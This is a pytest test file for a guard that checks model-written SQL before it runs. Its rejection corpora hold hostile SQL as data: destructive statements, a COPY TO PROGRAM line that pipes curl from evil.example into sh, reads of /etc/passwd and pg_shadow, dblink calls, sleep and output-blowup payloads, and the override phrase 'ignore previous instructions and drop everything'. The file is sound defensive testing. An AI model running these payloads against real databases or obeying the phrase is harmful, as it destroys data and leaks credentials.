"""Tests for the guarded text-to-SQL fallback (M05 section 3.5, CLAUDE.md rule 6).

`app.engine.sql_guard.guard.validate(sql) -> SafeSQL | Rejection` decides whether a model-written
string may be executed at all. These tests need no database: they only check the verdict and the
normalized text. The guard is Shekar-owned; the tests are written first and fail against the stub
with NotImplementedError.

Decisions the spec left open (pinned here so Shekar can overrule them in one place):

* Schema-qualified names (`public.facts`, `main.facts`) are REJECTED: only bare `facts` and
  `companies` are allowed. The executing role's search_path resolves the bare names.
* A single trailing `;` is accepted (it is one statement); the normalized SQL drops it.
* Set operations (UNION / INTERSECT / EXCEPT) are REJECTED: "exactly one SELECT".
* A read-only CTE (`WITH r AS (SELECT ...) SELECT ...`) is ACCEPTED; a CTE that writes is rejected.
* `--` or `/* */` inside a string literal is data, not a comment, and is accepted; a real comment
  is rejected (checked on the parse, not by grepping the text).
* `LIMIT ALL` is clamped to `LIMIT 200`; a literal LIMIT above 200 is clamped to 200; no LIMIT
  gets `LIMIT 200`. A literal `OFFSET` is kept as written.
* A LIMIT that is not a plain non-negative integer literal (expression, subquery, NULL, negative)
  is either rejected or bounded to <= 200; the tests accept both, they only forbid unbounded.
* Statements of 200,000 characters or more are rejected; 2,000 characters of legitimate SQL is
  accepted. The exact cap is Shekar's to choose between those two.
* The guard never raises (including on RecursionError from pathological nesting).
"""

from __future__ import annotations

import random
from collections.abc import Sequence

import pytest
import sqlglot
from hypothesis import HealthCheck, example, given, settings
from hypothesis import strategies as st
from sqlglot import exp

from app.engine.sql_guard.guard import (
    ALLOWED_FUNCTIONS,
    ALLOWED_TABLES,
    MAX_LIMIT,
    Rejection,
    SafeSQL,
    validate,
)

# --- the independent oracle ------------------------------------------------------------------

# sqlglot models these operators/keywords as exp.Func subclasses; they are not function calls.
_STRUCTURAL = (exp.Cast, exp.TryCast, exp.Case, exp.If, exp.And, exp.Or, exp.Exists)


def _func_name(node: exp.Func) -> str:
    return (node.name if isinstance(node, exp.Anonymous) else node.sql_name()).lower()


def _int_literal(node: exp.Expression | None) -> int:
    assert isinstance(node, exp.Literal), f"expected an integer literal, got {node!r}"
    assert not node.is_string and node.name.isdigit(), f"not a plain integer: {node.sql()}"
    return int(node.name)


def assert_independently_safe(sql: str) -> exp.Select:
    """Re-parse `sql` with sqlglot (postgres) and assert every guard promise. Returns the root."""
    statements = [s for s in sqlglot.parse(sql, dialect="postgres") if s is not None]
    assert len(statements) == 1, f"expected exactly one statement, got {len(statements)}: {sql!r}"
    root = statements[0]
    assert type(root) is exp.Select, f"root is {type(root).__name__}, not a plain SELECT: {sql!r}"

    ctes = {c.alias.lower() for c in root.find_all(exp.CTE)}
    for table in root.find_all(exp.Table):
        if isinstance(table.this, exp.Func):  # FROM some_function(...): the Func check rejects it
            continue
        assert not table.args.get("db") and not table.args.get("catalog"), (
            f"schema-qualified table {table.sql()!r} in {sql!r}"
        )
        name = table.name.lower()
        assert name in ALLOWED_TABLES or name in ctes, f"table {name!r} not allowed in {sql!r}"

    allowed_funcs = {f.lower() for f in ALLOWED_FUNCTIONS}
    for func in root.find_all(exp.Func):
        if isinstance(func, _STRUCTURAL):
            continue
        assert _func_name(func) in allowed_funcs, f"function {_func_name(func)!r} in {sql!r}"

    forbidden = (exp.Insert, exp.Update, exp.Delete, exp.Merge, exp.Create, exp.Drop, exp.Alter)
    assert not list(root.find_all(*forbidden)), f"writing node inside {sql!r}"
    assert not list(root.find_all(exp.Into)), f"SELECT INTO in {sql!r}"
    assert not list(root.find_all(exp.Lock)), f"FOR UPDATE/SHARE in {sql!r}"
    assert not any(n.comments for n in root.walk()), f"comment survived in {sql!r}"

    limit = root.args.get("limit")
    assert limit is not None, f"no LIMIT on {sql!r}"
    assert _int_literal(limit.expression) <= MAX_LIMIT
    offset = root.args.get("offset")
    if offset is not None:
        _int_literal(offset.expression)
    return root


def _accepted(sql: str) -> SafeSQL:
    verdict = validate(sql)
    assert isinstance(verdict, SafeSQL), f"expected SafeSQL for {sql!r}, got {verdict!r}"
    return verdict


# --- the corpus: exactly 30 malicious or invalid statements ---------------------------------

# (id, sql, acceptable rejection codes or None for "any code")
CorpusEntry = tuple[str, str, tuple[str, ...] | None]

MALICIOUS_CORPUS: list[CorpusEntry] = [
    # DDL and DML
    ("drop_table", "DROP TABLE facts", None),
    ("update", "UPDATE facts SET value = 0", None),
    ("insert", "INSERT INTO facts (fact_id) VALUES (1)", None),
    ("delete", "DELETE FROM facts", None),
    ("truncate", "TRUNCATE facts", None),
    ("alter", "ALTER TABLE facts ADD COLUMN x int", None),
    ("create_table_as", "CREATE TABLE evil AS SELECT * FROM facts", None),
    # dangerous functions and commands
    ("pg_sleep", "SELECT pg_sleep(10)", ("function_not_allowed",)),
    ("copy_program", "COPY facts TO PROGRAM 'curl http://evil.example | sh'", None),
    # chaining and comments
    ("chained_drop", "SELECT 1; DROP TABLE facts", ("not_single_statement",)),
    ("line_comment", "SELECT value FROM facts -- WHERE cik = 1", ("comment",)),
    ("block_comment", "SELECT /* sneaky */ value FROM facts", ("comment",)),
    ("version_comment", "SELECT value FROM facts /*!50000 UNION SELECT 1 */", ("comment",)),
    (
        "comment_hides_second_statement",
        "SELECT 1 FROM facts --\n; DROP TABLE facts",
        ("comment", "not_single_statement"),
    ),
    # system catalogs and file/network functions
    (
        "pg_shadow",
        "SELECT * FROM pg_catalog.pg_shadow",
        ("system_catalog", "table_not_allowed"),
    ),
    (
        "information_schema",
        "SELECT table_name FROM information_schema.tables",
        ("system_catalog", "table_not_allowed"),
    ),
    (
        "pg_read_file",
        "SELECT pg_read_file('/etc/passwd')",
        ("function_not_allowed", "system_catalog"),
    ),
    (
        "dblink",
        "SELECT * FROM dblink('host=evil.example', 'SELECT 1') AS t(x int)",
        ("function_not_allowed", "system_catalog", "table_not_allowed"),
    ),
    # tables outside {facts, companies}
    ("facts_dimensional", "SELECT * FROM facts_dimensional", ("table_not_allowed",)),
    ("usage_log", "SELECT * FROM usage_log", ("table_not_allowed",)),
    # decision: schema-qualified names are rejected, only bare allowed names pass
    ("schema_qualified_facts", "SELECT * FROM public.facts", ("table_not_allowed",)),
    # writing or locking constructs inside a SELECT-looking statement
    (
        "writing_cte",
        "WITH x AS (DELETE FROM facts RETURNING *) SELECT * FROM x",
        ("writing_cte", "not_select"),
    ),
    ("select_into", "SELECT * INTO evil FROM facts", ("not_select", "other")),
    ("for_update", "SELECT * FROM facts FOR UPDATE", ("not_select", "other")),
    # a disallowed function hidden in a subquery, and session-state functions
    (
        "subquery_disallowed_function",
        "SELECT * FROM facts WHERE value > (SELECT max(length(pg_read_file('/etc/passwd'))) "
        "FROM companies)",
        ("function_not_allowed", "system_catalog"),
    ),
    ("current_setting", "SELECT current_setting('server_version') FROM facts", None),
    # nothing, not SQL, lookalikes, and size
    ("empty", "", ("empty",)),
    ("non_sql_text", "What was Apple's revenue in fiscal 2023?", ("parse_error", "not_select")),
    # Cyrillic 'a' (U+0430) in the table name: not the allowed table
    ("homoglyph_table_name", "SELECT * FROM f\u0430cts", None),
    ("overlong_statement", "SELECT sum(value)" + " + 1" * 50_000 + " FROM facts", None),
]


def _ids(entries: Sequence[CorpusEntry]) -> list[str]:
    return [e[0] for e in entries]


def test_corpus_has_exactly_thirty_entries() -> None:
    """M05 section 3.5 asks for a corpus of 30 malicious or invalid statements; keep it at 30.

    A silent change in size means a case was dropped or double-counted, so the count is pinned
    (and the ids must be unique so every case is individually visible in the report)."""
    assert len(MALICIOUS_CORPUS) == 30
    assert len(set(_ids(MALICIOUS_CORPUS))) == 30


@pytest.mark.parametrize(
    ("sql", "codes"), [pytest.param(e[1], e[2], id=e[0]) for e in MALICIOUS_CORPUS]
)
def test_corpus_entry_is_rejected(sql: str, codes: tuple[str, ...] | None) -> None:
    """Every corpus statement yields a Rejection: never SafeSQL, never an exception.

    The guard is the only thing between a model-written string and the database, so a hostile
    input must come back as data. Where the category is unambiguous the rejection code is
    checked too, so a wrong reason (for example a comment reported as a parse error) is visible.
    """
    verdict = validate(sql)
    assert isinstance(verdict, Rejection), f"accepted a hostile statement: {verdict!r}"
    assert verdict.detail.strip(), "a Rejection must say why"
    if codes is not None:
        assert verdict.code in codes, f"code {verdict.code!r} not in {codes}"


# Extra adversarial inputs beyond the 30: all must be rejected, none may raise.
EXTRA_REJECTED: list[tuple[str, str]] = [
    ("api_keys", "SELECT key_hash FROM api_keys"),
    ("chunks", "SELECT text FROM chunks"),
    ("set_config", "SELECT set_config('statement_timeout', '0', false)"),
    ("lo_import", "SELECT lo_import('/etc/passwd')"),
    ("two_selects", "SELECT 1 FROM facts; SELECT 2 FROM facts"),
    ("copy_to_file", "COPY (SELECT * FROM facts) TO '/tmp/facts.csv'"),
    ("pg_sleep_in_where", "SELECT 1 FROM facts WHERE pg_sleep(5) IS NULL"),
    ("pg_sleep_mixed_case", "SELECT Pg_Sleep(5)"),
    ("pg_sleep_quoted", 'SELECT "pg_sleep"(5)'),
    ("pg_sleep_schema_qualified", "SELECT pg_catalog.pg_sleep(5)"),
    ("union_with_disallowed_table", "SELECT cik FROM facts UNION SELECT cik FROM api_keys"),
    ("union_of_allowed_tables", "SELECT cik FROM facts UNION SELECT cik FROM companies"),
    ("intersect", "SELECT cik FROM facts INTERSECT SELECT cik FROM companies"),
    ("join_disallowed_table", "SELECT * FROM facts f JOIN api_keys k ON true"),
    ("comma_join_disallowed_table", "SELECT * FROM facts, api_keys"),
    ("disallowed_table_in_subquery", "SELECT * FROM facts WHERE cik IN (SELECT cik FROM api_keys)"),
    ("disallowed_table_in_from_subquery", "SELECT * FROM (SELECT * FROM usage_log) t"),
    ("disallowed_table_aliased_as_allowed", "SELECT * FROM api_keys AS facts"),
    ("cte_reads_disallowed_table", "WITH r AS (SELECT * FROM api_keys) SELECT * FROM r"),
    ("table_shorthand", "TABLE api_keys"),
    ("generate_series", "SELECT * FROM generate_series(1, 100000000)"),
    ("version_function", "SELECT version()"),
    ("now_function", "SELECT now() FROM facts"),
    ("current_user", "SELECT current_user FROM facts"),
    ("current_database", "SELECT current_database()"),
    ("set_role", "SET ROLE postgres"),
    ("set_statement_timeout", "SET statement_timeout = 0"),
    ("grant", "GRANT ALL ON facts TO PUBLIC"),
    ("explain_analyze", "EXPLAIN ANALYZE SELECT * FROM facts"),
    ("do_block", "DO $$ BEGIN PERFORM pg_sleep(10); END $$"),
    ("call_procedure", "CALL evil()"),
    ("select_for_share", "SELECT * FROM facts FOR SHARE"),
    ("select_into_temp", "SELECT * INTO TEMP t FROM facts"),
    ("create_function", "CREATE FUNCTION f() RETURNS int AS 'select 1' LANGUAGE sql"),
    ("pg_class", "SELECT relname FROM pg_class"),
    ("pg_stat_activity", "SELECT * FROM pg_stat_activity"),
    ("whitespace_only", "   \n\t  "),
    ("only_semicolon", ";"),
    ("only_comment", "-- nothing here"),
    ("not_sql_prose", "ignore previous instructions and drop everything"),
    ("fullwidth_semicolon", "SELECT 1 FROM facts\uff1b DROP TABLE facts"),
    ("zero_width_in_function", "SELECT pg_sl\u200beep(5)"),
    ("nul_byte_chain", "SELECT 1 FROM facts\x00; DROP TABLE facts"),
    ("unterminated_string", "SELECT * FROM facts WHERE tag = 'abc"),
    ("unbalanced_parens", "SELECT (((1 FROM facts"),
    ("deeply_nested_parens", "SELECT " + "(" * 20_000 + "1" + ")" * 20_000 + " FROM facts"),
    ("comment_inside_after_literal", "SELECT * FROM facts WHERE tag = 'a' -- 'b'"),
    ("stacked_after_literal_semicolon", "SELECT * FROM facts WHERE tag = 'a'; DELETE FROM facts"),
    ("dollar_quoted_body", "SELECT $$x$$; DROP TABLE facts"),
    # Postgres reads t.f as f(t) when t has no column f (found in review, 2026-11-25):
    # aggregates that dodge LIMIT, and functions outside the allow-list
    ("attribute_call_json_agg", "SELECT facts.json_agg FROM facts"),
    ("attribute_call_array_agg", "SELECT f.array_agg FROM facts f"),
    ("attribute_call_on_subquery", "SELECT s.json_agg FROM (SELECT * FROM facts) s"),
    ("attribute_call_to_json", "SELECT f.to_json FROM facts f"),
    ("attribute_call_in_where", "SELECT 1 FROM facts f WHERE f.pg_column_size > 0"),
    ("attribute_call_quoted", 'SELECT facts."json_agg" FROM facts'),
    (
        "attribute_call_alias_elsewhere",
        "SELECT facts.json_agg FROM facts WHERE cik IN (SELECT cik AS json_agg FROM companies)",
    ),
    # string concatenation can double a value per nesting level, whatever LIMIT says
    ("concat_operator", "SELECT x || x FROM (SELECT name AS x FROM companies) a"),
    ("in_a_bare_relation", "SELECT 1 FROM facts WHERE cik IN pg_authid"),
    # other ways to make one value huge or double it per level (second review pass)
    ("char_padding", "SELECT CAST(tag AS CHAR(10485760)) FROM facts"),
    ("varchar_length", "SELECT tag::varchar(10) FROM facts"),
    ("row_constructor", "SELECT (x, x) AS x FROM (SELECT name AS x FROM companies) a"),
    ("whole_row_of_subquery", "SELECT a AS x, a AS y FROM (SELECT name FROM companies) a"),
    ("whole_row_of_table", "SELECT facts FROM facts"),
    ("whole_row_of_alias", "SELECT f FROM facts f"),
    ("whole_row_of_cte", "WITH r AS (SELECT cik FROM facts) SELECT r FROM r"),
    # third review pass: `alias.*` inside an expression is the whole row too. These are only
    # parsed here; do NOT run nested forms against a server (the output doubles per level).
    ("star_in_cast", "SELECT CAST(a.* AS TEXT) AS x FROM (SELECT name FROM companies) a"),
    ("star_in_colon_cast", "SELECT a.*::text FROM (SELECT name FROM companies) a"),
    ("star_in_coalesce", "SELECT coalesce(facts.*) FROM facts"),
    ("star_in_parens", "SELECT (a.*) AS x FROM (SELECT name FROM companies) a"),
    ("star_in_count", "SELECT count(f.*) FROM facts f"),
    ("star_in_where", "SELECT 1 FROM facts f WHERE CAST(f.* AS TEXT) LIKE 'a%'"),
    (
        "star_of_join_alias",
        "SELECT CAST(j.* AS TEXT) FROM (facts f JOIN companies c ON c.cik = f.cik) AS j",
    ),
    # Postgres cuts identifiers to 63 characters, so a longer spelling names the same relation
    (
        "truncated_identifier_whole_row",
        "SELECT " + "a" * 63 + "y AS x FROM companies AS " + "a" * 63 + "z",
    ),
    ("overlong_identifier", "SELECT cik AS " + "b" * 64 + " FROM facts"),
]


@pytest.mark.parametrize("sql", [e[1] for e in EXTRA_REJECTED], ids=[e[0] for e in EXTRA_REJECTED])
def test_extra_adversarial_input_is_rejected(sql: str) -> None:
    """Further hostile or malformed inputs are rejected as data, never raised, never accepted.

    Covers what the corpus does not: set operations (decision: only one plain SELECT), the
    remaining tables, quoting and case games on function names, session-control statements,
    full-width and zero-width characters, a NUL byte, and nesting deep enough to overflow a
    recursive parser (the guard must turn RecursionError into a Rejection)."""
    verdict = validate(sql)
    assert isinstance(verdict, Rejection), f"accepted: {verdict!r}"
    assert verdict.detail.strip()


# --- positive cases ---------------------------------------------------------------------------

ACCEPTED: list[tuple[str, str]] = [
    ("sum_with_filter", "SELECT sum(value) FROM facts WHERE tag = 'Revenues' AND cik = 320193"),
    (
        "join_facts_companies",
        "SELECT f.value, c.name FROM facts f JOIN companies c ON c.cik = f.cik "
        "WHERE c.ticker = 'AAPL' AND f.fiscal_year = 2023",
    ),
    (
        "group_by_order_by",
        "SELECT cik, round(avg(value), 2) AS a FROM facts GROUP BY cik ORDER BY a DESC",
    ),
    (
        "all_allowed_functions",
        "SELECT sum(value), avg(value), min(value), max(value), count(*), "
        "round(value, 2), abs(value), coalesce(value, 0) FROM facts",
    ),
    ("count_distinct", "SELECT count(DISTINCT cik) FROM facts"),
    ("uppercase_keywords_and_functions", "SELECT SUM(value) FROM FACTS WHERE cik = 1"),
    (
        "having_clause",
        "SELECT cik, sum(value) AS s FROM facts GROUP BY cik HAVING sum(value) > 1000000",
    ),
    ("allowed_table_in_subquery", "SELECT * FROM facts WHERE cik IN (SELECT cik FROM companies)"),
    ("derived_table", "SELECT t.cik FROM (SELECT cik FROM facts) t"),
    ("scalar_subquery", "SELECT cik, (SELECT max(value) FROM facts) AS m FROM companies"),
    (
        "read_only_cte",
        "WITH r AS (SELECT cik, max(value) AS m FROM facts GROUP BY cik) SELECT * FROM r",
    ),
    ("trailing_semicolon", "SELECT value FROM facts;"),
    ("double_dash_inside_literal", "SELECT * FROM facts WHERE tag = 'a--b'"),
    ("block_comment_inside_literal", "SELECT * FROM facts WHERE tag = '/* x */'"),
    ("semicolon_inside_literal", "SELECT * FROM facts WHERE tag = 'a;b'"),
    ("leading_trailing_whitespace", "  \n SELECT value FROM facts \n\t "),
    ("order_by_limit", "SELECT value FROM facts ORDER BY value DESC LIMIT 5"),
    (
        "qualified_star_in_select_list",
        "SELECT f.*, c.name FROM facts f JOIN companies c ON c.cik = f.cik",
    ),
    ("count_star", "SELECT count(*) FROM facts"),
    ("identifier_of_63_characters", "SELECT cik AS " + "b" * 63 + " FROM facts"),
]


@pytest.mark.parametrize("sql", [a[1] for a in ACCEPTED], ids=[a[0] for a in ACCEPTED])
def test_legitimate_select_is_accepted_and_normalized(sql: str) -> None:
    """Plain read-only SELECTs over facts/companies with allowed functions are accepted.

    Without positive cases a guard that rejects everything would pass the corpus. The normalized
    SQL must itself satisfy every promise (checked by an independent sqlglot parse): one SELECT,
    allowed tables and functions only, no comment, a LIMIT of at most 200."""
    verdict = _accepted(sql)
    assert_independently_safe(verdict.sql)
    assert not verdict.sql.rstrip().endswith(";"), "normalized SQL must not carry a trailing ';'"


def test_accepted_sql_keeps_its_meaning() -> None:
    """Normalization does not rewrite the query: same tables, same filter, same aggregate.

    A guard that returned `SELECT 1 LIMIT 200` for everything would be 'safe' and useless."""
    verdict = _accepted(
        "SELECT f.cik, sum(f.value) AS s FROM facts f JOIN companies c ON c.cik = f.cik "
        "WHERE f.tag = 'Revenues' GROUP BY f.cik ORDER BY s DESC"
    )
    root = sqlglot.parse_one(verdict.sql, dialect="postgres")
    assert {t.name.lower() for t in root.find_all(exp.Table)} == {"facts", "companies"}
    assert "Revenues" in verdict.sql
    assert root.args.get("group") is not None and root.args.get("order") is not None
    assert [f.sql_name() for f in root.find_all(exp.Sum)] == ["SUM"]


def test_a_long_but_legitimate_statement_is_accepted() -> None:
    """2,000 characters of legitimate SQL is not 'overlong': the size cap must not bite real use."""
    sql = "SELECT " + ", ".join(f"sum(value) AS s{i}" for i in range(110)) + " FROM facts"
    assert 2_000 <= len(sql) < 5_000
    _accepted(sql)


def test_validate_is_deterministic() -> None:
    """The same input gives the same verdict; the guard keeps no state between calls."""
    sql = "SELECT sum(value) FROM facts WHERE cik = 1"
    first = validate(sql)
    assert validate(sql) == first
    assert validate("DROP TABLE facts").__class__ is Rejection  # a rejection does not poison it
    assert validate(sql) == first


# --- LIMIT and OFFSET -------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("suffix", "expected_limit"),
    [
        ("", 200),
        (" LIMIT 5000", 200),
        (" LIMIT 10", 10),
        (" LIMIT 200", 200),
        (" LIMIT 201", 200),
        (" LIMIT 1", 1),
        (" LIMIT 0", 0),
        (" LIMIT ALL", 200),
        (" limit all", 200),
        (" LIMIT 99999999999999999999", 200),
    ],
    ids=[
        "absent_injects_200",
        "5000_clamped",
        "10_kept",
        "200_kept",
        "201_clamped",
        "1_kept",
        "0_kept",
        "all_clamped",
        "all_lowercase_clamped",
        "beyond_int64_clamped",
    ],
)
def test_limit_is_injected_or_clamped(suffix: str, expected_limit: int) -> None:
    """Absent LIMIT becomes 200; above 200 (and LIMIT ALL, which is 'no limit') is clamped to
    200; at or below 200 is kept. Result size is the guard's only resource control besides the
    statement timeout."""
    verdict = _accepted("SELECT value FROM facts" + suffix)
    root = assert_independently_safe(verdict.sql)
    assert _int_literal(root.args["limit"].expression) == expected_limit


def test_limit_in_a_subquery_does_not_replace_the_outer_limit() -> None:
    """A big inner LIMIT must not satisfy the check: the OUTER statement is what returns rows."""
    verdict = _accepted("SELECT * FROM (SELECT * FROM facts LIMIT 5000) t")
    root = assert_independently_safe(verdict.sql)
    assert _int_literal(root.args["limit"].expression) == 200


@pytest.mark.parametrize(
    ("suffix", "limit", "offset"),
    [
        (" LIMIT 10 OFFSET 5", 10, 5),
        (" OFFSET 5", 200, 5),
        (" OFFSET 5 LIMIT 5000", 200, 5),
        (" LIMIT 5000 OFFSET 400", 200, 400),
        (" LIMIT ALL OFFSET 3", 200, 3),
    ],
    ids=["limit_offset", "offset_only", "offset_then_big_limit", "big_limit_offset", "all_offset"],
)
def test_offset_is_kept_and_limit_still_bounded(suffix: str, limit: int, offset: int) -> None:
    """Decision: a literal OFFSET is allowed and kept as written (paging is legitimate); only the
    page SIZE is bounded. OFFSET with no LIMIT still gets LIMIT 200."""
    verdict = _accepted("SELECT value FROM facts ORDER BY value" + suffix)
    root = assert_independently_safe(verdict.sql)
    assert _int_literal(root.args["limit"].expression) == limit
    assert _int_literal(root.args["offset"].expression) == offset


@pytest.mark.parametrize(
    "suffix",
    [
        " LIMIT 100 + 100000",
        " LIMIT 1000 * 1000",
        " LIMIT (SELECT 100000)",
        " LIMIT NULL",
        " LIMIT -1",
        " LIMIT 1e9",
        " LIMIT $1",
        " LIMIT 10 OFFSET (SELECT 1)",
    ],
    ids=[
        "sum_expression",
        "product_expression",
        "subquery",
        "null_means_unbounded",
        "negative",
        "scientific",
        "placeholder",
        "offset_subquery",
    ],
)
def test_non_literal_limit_is_rejected_or_bounded(suffix: str) -> None:
    """A LIMIT that is not a plain integer literal can never be left as written. Rejecting it or
    rewriting it to <= 200 are both fine (the spec does not say); passing it through is not."""
    verdict = validate("SELECT value FROM facts" + suffix)
    if isinstance(verdict, SafeSQL):
        assert_independently_safe(verdict.sql)


def test_max_limit_constant_is_200() -> None:
    """The contract says 200; the property tests above hard-wire it through MAX_LIMIT."""
    assert MAX_LIMIT == 200


def test_allowlists_match_the_spec() -> None:
    """M05 section 3.5 names exactly these tables and functions; widening either is a decision
    for an ADR, so this test makes the widening visible."""
    assert ALLOWED_TABLES == {"facts", "companies"}
    assert ALLOWED_FUNCTIONS == {"sum", "avg", "min", "max", "count", "round", "abs", "coalesce"}


# --- property tests ---------------------------------------------------------------------------

_SELECT_ITEMS = [
    "*",
    "value",
    "cik",
    "sum(value)",
    "count(*)",
    "round(avg(value), 2)",
    "coalesce(value, 0)",
    "abs(value)",
    "pg_sleep(1)",
    "current_user",
    "now()",
    "version()",
    "pg_read_file('/etc/passwd')",
    "Pg_Sleep(1)",
    "(SELECT max(value) FROM facts)",
    "(SELECT pg_sleep(1))",
    "(SELECT count(*) FROM api_keys)",
]
_FROM_ITEMS = [
    "facts",
    "companies",
    "FACTS",
    "facts f JOIN companies c ON c.cik = f.cik",
    "facts f JOIN api_keys k ON true",
    "public.facts",
    "facts_dimensional",
    "api_keys",
    "usage_log",
    "chunks",
    "pg_catalog.pg_shadow",
    "information_schema.tables",
    "(SELECT * FROM facts LIMIT 5000) t",
    "(SELECT * FROM usage_log) t",
    "generate_series(1, 10)",
]
_WHERES = [
    "",
    "WHERE cik = 1",
    "WHERE tag = 'a--b'",
    "WHERE tag = 'x;y'",
    "WHERE cik IN (SELECT cik FROM companies)",
    "WHERE cik IN (SELECT cik FROM api_keys)",
    "WHERE pg_sleep(1) IS NULL",
    "WHERE value > (SELECT avg(value) FROM facts)",
]
_TAILS = [
    "",
    "GROUP BY cik",
    "ORDER BY 1",
    "LIMIT ALL",
    "LIMIT NULL",
    "LIMIT 10 + 100000",
    "FOR UPDATE",
    "-- note",
    "/* note */",
    "; DROP TABLE facts",
    "; SELECT 1",
    ";",
    "UNION SELECT 1",
]
_PREFIXES = [
    "",
    "WITH r AS (SELECT * FROM facts) ",
    "WITH r AS (DELETE FROM facts RETURNING *) ",
    "WITH r AS (SELECT * FROM api_keys) ",
]


@st.composite
def statements(draw: st.DrawFn) -> str:
    """Statements assembled from a pool mixing safe and unsafe fragments, so some are accepted."""
    parts = [
        draw(st.sampled_from(_PREFIXES)),
        "SELECT ",
        draw(st.sampled_from(_SELECT_ITEMS)),
        " FROM ",
        draw(st.sampled_from(_FROM_ITEMS)),
        " ",
        draw(st.sampled_from(_WHERES)),
        " ",
        draw(st.sampled_from(_TAILS)),
    ]
    paging = draw(st.sampled_from(["", "LIMIT {n}", "LIMIT {n} OFFSET {m}", "OFFSET {m}"]))
    n = draw(st.integers(min_value=0, max_value=10**7))
    m = draw(st.integers(min_value=0, max_value=10**4))
    sql = "".join(parts)
    # put paging before any trailing "; ..." / comment tail so it is sometimes effective
    return sql if not paging else sql + " " + paging.format(n=n, m=m)


_SEEDS = [a[1] for a in ACCEPTED] + [e[1] for e in MALICIOUS_CORPUS if len(e[1]) < 1000]
_FRAGMENTS = [
    "; DROP TABLE facts",
    "--",
    "/*",
    "*/",
    "pg_sleep(1)",
    " INTO x ",
    " FOR UPDATE",
    " LIMIT 99999",
    " api_keys",
    "(",
    ")",
    "'",
    '"',
    "\x00",
    "\u200b",
    " UNION SELECT 1",
    "public.",
]


@st.composite
def mutated(draw: st.DrawFn) -> str:
    """A seed statement with random edits: deletions, insertions of hostile fragments, swaps."""
    sql = draw(st.sampled_from(_SEEDS))
    rng = random.Random(draw(st.integers(min_value=0, max_value=2**32)))
    for _ in range(draw(st.integers(min_value=1, max_value=3))):
        pos = rng.randrange(len(sql) + 1)
        op = rng.choice(["insert", "delete", "replace"])
        if op == "insert":
            sql = sql[:pos] + rng.choice(_FRAGMENTS) + sql[pos:]
        elif op == "delete":
            sql = sql[:pos] + sql[pos + rng.randrange(1, 12) :]
        else:
            sql = sql[:pos] + rng.choice(_FRAGMENTS) + sql[pos + rng.randrange(0, 6) :]
    return sql


_PROP = settings(
    max_examples=500,
    deadline=None,
    suppress_health_check=[HealthCheck.too_slow, HealthCheck.filter_too_much],
)


@_PROP
@given(statements())
@example("SELECT sum(value) FROM facts")
@example("SELECT value FROM facts LIMIT 5000")
@example("SELECT f.value FROM facts f JOIN companies c ON c.cik = f.cik LIMIT ALL OFFSET 4")
@example("WITH r AS (SELECT * FROM facts) SELECT * FROM r")
@example("SELECT value FROM public.facts")
@example("SELECT sum(value) FROM facts WHERE pg_sleep(1) IS NULL")
@example("SELECT value FROM facts FOR UPDATE")
@example("SELECT value FROM facts -- note")
@example("WITH r AS (DELETE FROM facts RETURNING *) SELECT * FROM r")
@example("SELECT value FROM facts LIMIT 5000 OFFSET 7")
def test_property_every_accepted_statement_is_independently_safe(sql: str) -> None:
    """For ANY assembled statement the guard accepts, an independent sqlglot (postgres) parse of
    the returned SQL shows exactly one SELECT, only facts/companies (or CTE names), only allowed
    functions, no write/INTO/lock/comment, and a literal LIMIT <= 200. Rejections are always
    well-formed. This is the guard's whole contract, stated without reference to its code."""
    verdict = validate(sql)
    if isinstance(verdict, SafeSQL):
        assert_independently_safe(verdict.sql)
    else:
        assert isinstance(verdict, Rejection)
        assert verdict.detail.strip()


@_PROP
@given(mutated())
def test_property_mutated_seeds_never_slip_through(sql: str) -> None:
    """Random edits of known-good and known-bad statements (inserted `--`, `;`, quotes, NUL,
    zero-width characters, schema prefixes): whatever is accepted is still independently safe.
    Mutation finds the near-misses a hand-written corpus misses."""
    verdict = validate(sql)
    if isinstance(verdict, SafeSQL):
        assert_independently_safe(verdict.sql)


@_PROP
@given(statements())
def test_property_validate_output_is_a_fixed_point(sql: str) -> None:
    """Re-validating the normalized SQL returns the same SafeSQL: normalization is idempotent,
    so the text that is executed is exactly the text that was checked."""
    verdict = validate(sql)
    if isinstance(verdict, SafeSQL):
        assert validate(verdict.sql) == verdict


@_PROP
@given(st.text(max_size=300))
@example("")
@example("\x00")
@example(";" * 50)
@example("SELECT " + "(" * 3000)
def test_property_validate_never_raises_on_arbitrary_text(sql: str) -> None:
    """validate is total over str: arbitrary Unicode (control characters, lone surrogates'
    neighbours, SQL-ish noise) yields SafeSQL or Rejection, never an exception."""
    verdict = validate(sql)
    assert isinstance(verdict, SafeSQL | Rejection)
    if isinstance(verdict, SafeSQL):
        assert_independently_safe(verdict.sql)


@_PROP
@given(
    st.text(alphabet=list("SELECTFROMWHEREfactscompanies*,()';-/ \n0123456789=<>"), max_size=120)
)
def test_property_validate_never_raises_on_sql_flavoured_noise(sql: str) -> None:
    """Noise drawn from SQL's own alphabet reaches deeper parser paths than uniform text does;
    the guard must still return a verdict, and any acceptance must be independently safe."""
    verdict = validate(sql)
    assert isinstance(verdict, SafeSQL | Rejection)
    if isinstance(verdict, SafeSQL):
        assert_independently_safe(verdict.sql)
